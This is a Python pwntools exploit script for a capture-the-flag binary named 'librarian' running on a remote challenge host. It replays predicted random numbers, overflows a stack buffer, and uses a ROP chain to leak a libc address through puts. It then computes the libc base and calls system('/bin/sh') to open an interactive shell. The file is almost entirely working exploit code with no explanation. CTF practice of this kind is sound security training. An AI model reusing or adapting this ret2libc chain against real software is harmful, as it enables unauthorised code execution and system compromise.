#!/usr/bin/env python3

from pwn import *
import time
import binascii

LOCAL = 0

def get_new_process():
    if LOCAL:
        # return process(["./librarian"])
        p = process(["gdb", "./librarian"])
        time.sleep(1)
        p.recv()
        p.sendline('r')
        return p
    else:
        return remote("stephencurry.ctfchallenge.ga", 5003)

elf = ELF("./librarian")
libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so")
rop = ROP(elf)

PUTS_PLT = elf.plt['puts']
GETS_PLT = elf.plt['gets']
MAIN = elf.symbols['main']
PUTS_GOT = elf.got['puts']
GETS_GOT = elf.got['gets']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
POP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Puts@plt: " + hex(PUTS_PLT))
log.info("Puts@glt : " + hex(PUTS_GOT))
log.info("Pop rdi gadget: " + hex(POP_RDI))
log.info("rdi: " + hex(RET))

offset = b"a"*568
rands = [1189641421, 596516649, 1649760492, 719885386, 424238335, 1957747793, 1714636915, 1681692777, 846930886, 1804289383][::-1]
randidx = 0

def getrand():
    global randidx
    ret = str(rands[randidx])
    randidx += 1
    return ret

p = get_new_process()

print(p.recv())
p.sendline(getrand())
print(p.recv())
p.sendline(b'6')
print(p.recv())
payload1 = offset
payload1 += p64(POP_RDI)+p64(GETS_GOT)+p64(PUTS_PLT)+p64(MAIN)
p.sendline(payload1)
p.recvuntil(b"Thanks!\n")
gets_addr = binascii.hexlify(p.recvline().strip()[::-1])
print("gets addr:", gets_addr)

leak = int(gets_addr, 16)
log.info("Leaked libc address, Gets: %s" % hex(leak))

libc.address = leak - libc.sym["gets"]
log.info("Base address of libc: %s " % hex(libc.address))

BINSH = next(libc.search(b"/bin/sh")) 
SYSTEM = libc.sym["system"]

log.info("bin/sh: %s " % hex(BINSH))
log.info("system: %s " % hex(SYSTEM))

payload2 = offset
payload2 += p64(RET) 
payload2 += p64(POP_RDI) 
payload2 += p64(BINSH) 
payload2 += p64(SYSTEM)

print(p.recv())
p.sendline(getrand())
print(p.recv())
p.sendline(b'6')
print(p.recv())
p.sendline(payload2)


p.interactive()

    